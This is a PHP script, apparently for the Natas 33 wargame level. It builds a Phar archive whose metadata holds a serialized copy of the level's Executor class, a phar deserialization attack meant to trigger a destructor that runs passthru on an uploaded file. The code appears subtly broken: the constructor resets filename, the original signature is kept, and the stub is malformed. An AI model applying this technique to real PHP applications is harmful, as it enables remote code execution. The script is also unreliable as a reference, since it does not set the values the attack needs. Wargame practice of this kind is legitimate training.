<?php
class Executor{
    private $filename="natas33.php"; 
    private $signature='53032d85cf6b85ed75e8efc4c948f38b';
    private $init=False;

    function __construct(){
        $this->filename=$_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
        else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                echo "Firmware upgrad initialised.<br>";
            }
            else{
                echo "There was an error uploading the file, please try again!<br>";
            }
        }
        $this->filename = "natas33.php";
    }

    function __destruct(){
        // upgrade firmware at the end of this script

        // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            echo "Congratulations! Running firmware update: $this->filename <br>";
            passthru("php " . $this->filename);
        }
        else{
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}

// create new Phar
$object = new Executor();
$phar = new Phar('natas33.phar');
$phar->startBuffering();
$phar->addFromString('natas33.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($object);
$phar->stopBuffering();
?>